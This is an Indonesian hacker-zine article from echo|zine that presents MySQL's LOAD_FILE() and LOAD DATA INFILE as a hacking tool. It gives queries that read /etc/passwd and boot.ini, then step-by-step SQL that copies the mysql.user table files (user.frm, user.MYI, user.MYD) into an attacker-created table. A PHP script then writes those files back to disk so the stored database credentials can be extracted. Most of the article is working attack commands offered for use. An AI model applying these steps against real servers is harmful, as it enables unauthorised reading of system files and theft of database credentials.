@@ -1,0 +1,183 @@
+echo|zine, volume 5 issue 16                            
+Mysql hack: pemanfaatan fungsi LOAD_FILE & LOAD DATA INFILE 
+by az001 <az001 [at] plasa [dot] com>
+
+
+---// 	Pendahuluan
+
+        Pada kesempatan kali ini saya akan mencoba mengajak anda menggunakan 
+MySQL menjadi sebuah tools hacking menggunakan 2 fungsi yang ada dalam MySQL.
+
+---// 	Keterangan & Contoh Penggunaan LOAD_FILE() & LOAD DATA INFILE
+
+        Fungsi yang kita akan gunakan adalah load_file() dan LOAD DATA 
+INFILE, berikut ini adalah keterangannya
+
+- LOAD_FILE()
+        
+        Dengan fungsi ini, kita dapat membaca file-file yang terdapat 
+  pada server MySQL tersebut dan menampilkannya ke layar.
+  
+  Contoh : 
+
+  //--- query ----//
+
+  mysql> SELECT LOAD_FILE('/etc/passwd');
+  atau
+  mysql> SELECT LOAD_FILE('c:/boot.ini');
+
+  //--- query ----// 
+
+        Maka akan menampilkan isi dari file passwd atau file boot.ini
+
+- LOAD DATA INFILE 
+        
+        Dengan fungsi ini, kita dapat mengambil isi file dan menaruhnya kedalam database;
+
+  Contoh :
+
+  //--- query ----//
+
+  mysql> LOAD DATA INFILE '/etc/passwd' INTO TABLE namatable;
+  atau
+  mysql> LOAD DATA INFILE 'c:/boot.ini' INTO TABLE namatable;
+
+  //--- query ----//
+
+        Maka perintah tersebut akan mengambil isi file passwd atau file 
+  boot.ini dan menaruhnya ke tabel namatable.
+
+
+        Dengan fungsi-fungsi tersebut,kemungkinan kita juga dapat mengambil 
+file-file database (.MYI,.frm,.MYD) dari server tersebut selama file-file 
+tersebut BISA DIBACA OLEH SEMUA USER.
+
+
+---// 	Mengapa mengambil file-file tersebut ?
+
+        Sebenarnya anda bisa saja mengambil file-file yang lain, tetapi 
+jika user mysql anda tidak diizinkan untuk mengakses database mysql, anda 
+dapat menggunakan langkah-langkah ini.
+
+Contoh :
+
+Misal : 
+
+- Sistem operasi target adalah Windows
+- Direktori MySQL ada di C:\MySQL  
+
+
+Langkah yang kita lakukan sebelumnya adalah mencoba untuk membuat 
+
+- Database dengan nama db_dudulz
+- Tabel dengan nama tbl_dudulz yang memiliki field fl_namafile dengan tipe data varchar 
+  dan field fl_content dengan tipe data longblob;
+
+//--- query ----//
+
+mysql> create database db_dudulz;
+mysql> use db_dudulz;
+mysql> create table tbl_dudulz (fl_namafile varchar(20),fl_content longblob);
+
+//--- query ----//
+
+
+        Setelah itu kita akan mengambil isi file .MYI,.frm,.MYD dari 
+direktori C:\MySQL\data\mysql\, dalam hal ini kita hanya mengambil file table user 
+yakni file user.frm, user.MYI, user.MYD .
+
+
+//--- query ----//
+
+mysql> insert into tbl_dudulz values ('user.frm',load_file('c:\\MySQL\\data\\mysql\\user.frm')); 
+mysql> insert into tbl_dudulz values ('user.MYI',load_file('c:\\MySQL\\data\\mysql\\user.MYI'));
+mysql> insert into tbl_dudulz values ('user.MYD',load_file('c:\\MySQL\\data\\mysql\\user.MYD'));
+
+
+//--- query ----//
+
+
+---// 	Ambil Isi File
+
+        Setelah berhasil memasukkan isi dari file-file tersebut anda dapat 
+mengambil isi file tersebut dari database db_dudulz tadi dan menjadikannya 
+file.
+
+Ini adalah salah satu contohnya dengan PHP
+
+//------------------- code --------------------------------//
+
+<?
+
+$conn = mysql_connect("localhost","username","password");
+mysql_select_db("db_dudulz");
+
+$sql   = "SELECT * FROM tbl_dudulz";
+$query = mysql_query($sql,$conn);
+
+while($row=mysql_fetch_row($query))
+{
+        $bfile = fopen($row[0],"w");
+
+        fwrite($bfile,$row[1],strlen($row[1]));
+        fclose($bfile);
+
+} 
+mysql_close($conn);
+
+?>
+
+//------------------- code --------------------------------//
+
+
+        Setelah anda menjalankan script php tadi, lihatlah di direktori 
+script itu berada. Disana akan terdapat 3 file yakni user.frm , user.MYD 
+dan user.MYI. 
+
+        Kita juga dapat mengambil isi database ini melalui MySQL GUI atau 
+tool-tool sejenisnya.
+
+
+---// 	Catatan
+
+        Sebagai catatan, hal ini MUNGKIN tidak dapat dilakukan pada 
+sistem operasi keluarga Unix atau GNU/LINUX karena seperti yang 
+saya telah sampaikan tadi, fungsi-fungsi tersebut hanya dapat membaca file yang 
+bisa dibaca oleh semua user. Karena sepengetahuan saya default di sistem 
+operasi Windows hak akses membaca pada direktori MySQL dapat dilakukan oleh 
+hampir semua user.
+
+        Berbeda dengan sistem operasi keluarga Unix atau GNU/Linux dan 
+sejenisnya yang sepengetahuan saya defaultnya memiliki hak akses seperti 
+berikut ini : 
+
+-rw-rw---- 1 mysql mysql    248 2006-10-31 00:10 user.MYD
+-rw-rw---- 1 mysql mysql   2048 2006-10-31 00:10 user.MYI
+-rw-rw---- 1 mysql mysql  10330 2006-10-30 23:58 user.frm
+
+        File - file tersebut bisa saja diakses melalui fungsi-fungsi 
+tersebut jika memiliki hak akses sebagai berikut : 
+
+-rw-rw-rw-  1 mysql mysql    248 2006-10-31 00:10 user.MYD
+-rw-rw-rw-  1 mysql mysql   2048 2006-10-31 00:10 user.MYI
+-rw-rw-rw-  1 mysql mysql  10330 2006-10-30 23:58 user.frm
+
+
+---// 	Penutup
+
+        Selamat mencoba menggunakan MySQL sebagai hacking tools, semoga 
+artikel ini dapat berguna bagi kita semua.
+
+
+---// 	Referensi
+
+- MySQL Manual http://www.mysql.com
+- PHP Manual   http://www.php.net
+
+
+---//	Shoutz 
+
+- echo|staff : y3dips,m0by,the_day,comex,z3r0byt3,k-159,c-a-s-e,s'to,lirva32,
+  anonymous
+- seviour , anak2 ksl-bl 
+- yang baca artikel ini  
